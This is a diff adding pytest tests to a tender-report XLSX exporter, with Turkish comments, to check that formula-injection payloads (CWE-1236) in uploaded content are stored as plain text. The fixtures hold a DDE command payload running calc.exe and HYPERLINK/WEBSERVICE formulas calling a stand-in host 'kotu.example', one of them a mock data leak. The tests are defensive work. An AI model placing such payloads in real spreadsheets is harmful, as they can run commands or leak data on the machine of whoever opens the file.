@@ -140,3 +140,65 @@ def test_xlsx_ozet_ve_kategori_sayfasi_kaynak_kolonlari() -> None:
     assert row[4] == "şartname.pdf"
     assert row[5] == 4  # sayfa no her satırda
     assert row[6] == "Madde 7.2"
+
+
+# ── Formül enjeksiyonu (CWE-1236) ────────────────────────────────────────────
+# Rapor hücreleri saldırgan kontrolündedir: içerik müşterinin YÜKLEDİĞİ üçüncü
+# taraf şartnameden çıkarılır. openpyxl "=" ile başlayan string'i sessizce
+# formül olarak işaretler; böyle bir hücre raporu açan kişinin makinesinde
+# değerlendirilir. Aşağıdaki testler tipin string'e sabitlendiğini doğrular.
+
+_DDE_PAYLOAD = "=cmd|'/c calc.exe'!A0"
+
+
+def _injected_report() -> TenderReport:
+    source = SourceRef(
+        document='=HYPERLINK("http://kotu.example","tikla")',
+        page=1,
+        section="=1+1",
+        quote=_DDE_PAYLOAD,
+    )
+    return TenderReport(
+        organization='=WEBSERVICE("http://kotu.example/sizinti")',
+        tender_title=_DDE_PAYLOAD,
+        generated_at=datetime(2026, 7, 28, 9, 0),
+        sections=(
+            ReportSection(
+                title="Gereksinimler",
+                headers=("Gereksinim", "Tür", "Zorunlu"),
+                items=(
+                    ReportItem(
+                        cells=(_DDE_PAYLOAD, "İdari", "Evet"),
+                        review_status=ReviewStatus.APPROVED,
+                        source=source,
+                    ),
+                ),
+            ),
+        ),
+    )
+
+
+def test_xlsx_hicbir_hucre_formul_olarak_yazilmaz() -> None:
+    from openpyxl import load_workbook
+
+    workbook = load_workbook(BytesIO(build_xlsx_report(_injected_report())))
+
+    formulas = [
+        f"{sheet.title}!{cell.coordinate}={cell.value!r}"
+        for sheet in workbook.worksheets
+        for row in sheet.iter_rows()
+        for cell in row
+        if cell.data_type == "f"
+    ]
+    assert not formulas, f"Formül olarak yazılan hücreler: {formulas}"
+
+
+def test_xlsx_icerik_degistirilmeden_korunur() -> None:
+    """Savunma tipi sabitler, METNİ DEĞİŞTİRMEZ: ürün alıntı sadakati üzerine kurulu."""
+    from openpyxl import load_workbook
+
+    workbook = load_workbook(BytesIO(build_xlsx_report(_injected_report())))
+    sheet = workbook["Gereksinimler"]
+
+    assert sheet.cell(row=2, column=1).value == _DDE_PAYLOAD
+    assert workbook["Özet"].cell(row=4, column=2).value == _DDE_PAYLOAD
